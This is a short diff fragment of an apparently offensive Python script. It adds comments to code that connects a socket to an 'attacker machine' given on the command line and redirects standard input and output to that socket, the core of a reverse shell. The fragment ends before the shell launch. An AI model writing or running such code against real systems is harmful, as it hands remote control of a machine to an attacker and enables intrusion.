@@ -11,6 +11,9 @@ if len(sys.argv) < 3:
     exit(0)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# connect to attacker machine
+# IP: sys.argv[1], the remote host
+# PORT: sys.argv[2], the same port as used by the server
 s.connect((sys.argv[1], int(sys.argv[2])))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
